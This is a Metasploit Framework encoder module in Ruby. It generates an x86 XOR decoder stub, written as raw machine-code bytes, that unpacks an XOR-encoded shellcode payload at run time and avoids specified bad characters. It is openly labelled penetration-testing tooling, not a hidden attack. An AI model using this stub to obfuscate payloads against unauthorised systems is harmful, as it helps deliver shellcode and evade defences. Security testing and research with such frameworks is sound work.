##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Encoder::Xor

  def initialize
    super(
      'Name'             => 'Call+4 Dword XOR Encoder',
      'Description'      => 'Call+4 Dword XOR Encoder',
      'Author'           => [ 'hdm', 'spoonm' ],
      'Arch'             => ARCH_X86,
      'License'          => MSF_LICENSE,
      'Decoder'          =>
        {
          'KeySize'    => 4,
          'BlockSize'  => 4,
        })
  end

  #
  # Returns the decoder stub that is adjusted for the size of
  # the buffer being encoded
  #
  def decoder_stub(state)

    # Sanity check that saved_registers doesn't overlap with modified_registers
    if (modified_registers & saved_registers).length > 0
      raise BadGenerateError
    end

    decoder =
      Rex::Arch::X86.sub(-(((state.buf.length - 1) / 4) + 1), Rex::Arch::X86::ECX,
        state.badchars) +
      "\xe8\xff\xff\xff" + # call $+4
      "\xff\xc0"         + # inc eax
      "\x5e"             + # pop esi
      "\x81\x76\x0eXORK" + # xor [esi + 0xe], xork
      "\x83\xee\xfc"     + # sub esi, -4
      "\xe2\xf4"           # loop xor

    # Calculate the offset to the XOR key
    state.decoder_key_offset = decoder.index('XORK')

    return decoder
  end

  # Indicate that this module can preserve some registers
  def can_preserve_registers?
    true
  end

  # A list of registers always touched by this encoder
  def modified_registers
    [ Rex::Arch::X86::ECX, Rex::Arch::X86::EAX, Rex::Arch::X86::ESI ]
  end

  # Convert the SaveRegisters to an array of x86 register constants
  def saved_registers
    Rex::Arch::X86.register_names_to_ids(datastore['SaveRegisters'])
  end
end
